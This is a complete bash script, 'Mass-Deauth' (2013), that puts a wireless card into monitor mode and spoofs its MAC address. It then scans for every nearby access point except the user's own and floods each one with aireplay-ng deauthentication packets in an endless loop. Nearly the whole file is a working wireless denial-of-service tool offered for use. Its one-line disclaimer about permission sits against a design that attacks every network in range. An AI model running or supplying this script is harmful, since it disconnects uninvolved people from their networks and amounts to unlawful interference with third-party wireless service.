#!/bin/bash
# Mass-Deauth Script by RFKiller <http://rfkiller.they.org>
# Mass-Deauth Script homepage <https://github.com/RFKiller/mass-deauth>
# Send all emails to <grant.c.stone@gmail.com>
# Copyright (c) GPLv3 - 2013 RFKiller
# Please see the LICENSE file that came with this program
# PLEASE USE THIS SCRIPT RESPONSIBLY.
# DO NOT USE ON NETWORKS YOU DON'T OWN OR DON'T HAVE PERMISSION TO ATTACK

########################### LET'S CHECK ID AT THE DOOR
if [[ $EUID -ne 0 ]]; then
	echo -e "\033[31m\n    [!] This script MUST be run as root. Aborting . . . [!]\033[0m\n" 1>&2
	sleep 1; exit 1
fi

########################### LET'S ALSO CHECK FOR REQUIRED PROGRAMS
command -v xterm > /dev/null 2>&1 || {
	echo -e >&2 "\033[31m\n    [!] This script requires Xterm to be installed. Aborting . . . [!]\033[0m\n"
	sleep 1; exit 1
}
command -v airmon-ng > /dev/null 2>&1 || {
	echo -e >&2 "\033[31m\n    [!] This script requires Airmon-ng to be installed. Aborting . . . [!]\033[0m\n"
	sleep 1; exit 1
}
command -v aireplay-ng > /dev/null 2>&1 || {
	echo -e >&2 "\033[31m\n    [!] This script requires Aireplay-ng to be installed. Aborting . . . [!]\033[0m\n"
	sleep 1; exit 1
}
command -v iw > /dev/null 2>&1 || {
	echo -e >&2 "\033[31m\n    [!] This script requires iw to be installed. Aborting . . . [!]\033[0m\n"
	sleep 1; exit 1
}
command -v ip > /dev/null 2>&1 || {
	echo -e >&2 "\033[31m\n    [!] This script requires ip to be installed. Aborting . . . [!]\033[0m\n"
	sleep 1; exit 1
}
command -v iwlist > /dev/null 2>&1 || {
	echo -e >&2 "\033[31m\n    [!] This script requires iwlist to be installed. Aborting . . . [!]\033[0m\n"
	sleep 1; exit 1
}
command -v macchanger > /dev/null 2>&1 || {
	echo -e >&2 "\033[31m\n    [!] This script requires GNU macchanger to be installed. Aborting . . . [!]\033[0m\n"
	sleep 1; exit 1
}

########################### LOGICAL STUFF - don't touch unless you're 31337
version="0.2"
atk="0"
MIFACE="mon0"

clear
echo -e "\e[01;32m[+]\e[00m Setting up for attack..."

while [[ ! $WIFACE ]]; do
	echo -e "\033[33m[>] Type the wireless interface you'd like to use and hit [ENTER]:\033[0m"
	read -e WIFACE
	sleep 1; echo
done
while [[ ! $DEAUTHS ]]; do
	echo -e "\033[33m[>] How many deauthentication packets would you to send to each router?\033[0m"
	read -e DEAUTHS
	sleep 1; echo
done
while [[ ! $waitTime ]]; do
	echo -e "\033[33m[>] How long would you like to wait (in seconds) between attacks?\033[0m"
	read -e waitTime
	sleep 1; echo
done
while [[ ! $ourAPmac ]]; do
	echo -e "\033[33m[>] Enter the MAC address of your router (so we don't attack it):\033[0m"
	read -e ourAPmac
	sleep 1; echo
done
export ourAPmac

function rmlogs() {
	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
}
function cleanup() {
	xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Killing deauths..." -e "killall -9 aireplay-ng"
	airmon-ng stop $MIFACE
	rmlogs
	exit 0
}

trap cleanup INT
ip link set $WIFACE up
rmlogs
xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Start $WIFACE" -e "ip link set $WIFACE up" &

while [[ ! $moncheck ]]; do
	moncheck=`iw dev | grep $MIFACE | awk '$0 ~ /Interface / {print $2}'`
	xterm -geometry 75x10+464+446 -T "Mass-Deauth v$version - Start $MIFACE" -e "ip link set $WIFACE up && airmon-ng start $WIFACE"
	moncheck=`iw dev | grep $MIFACE | awk '$0 ~ /Interface / {print $2}'`
done

echo -e "\e[01;32m[+]\e[00m Changing MAC Address...\n"
xterm -geometry 75x8+100+0 -T "Mass-Deauth v$version - Changing MAC Address of $MIFACE" -e "ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up" &
sleep 3
scan1="0"

while true; do
	curLine="1"
	x="1"
	echo -e "\e[01;33m[!] Press [ CTRL+C ]  in this window to kill attack...\e[00m\n"
	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
	rmlogs
	iwlist $WIFACE scan > /tmp/scan.tmp
	sleep 3
	awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$ourAPmac'/ {print $5}' /tmp/scan.tmp > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
	echo -e "\e[01;32m[>]\e[00m Deauthenticating $lineNum APs from scan data..."
	for (( b=1; b<=$lineNum; b++ )); do
			scan1="1"
			curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
			echo -e "\e[01;32m[>]\e[00m Deauthenticating all clients on $curAP ..."
			xterm -geometry 75x9+464+446 -T "Mass-Deauth v$version" -e "aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE" &
			curLine=$(($curLine+$x))
	done
	atk="1"
done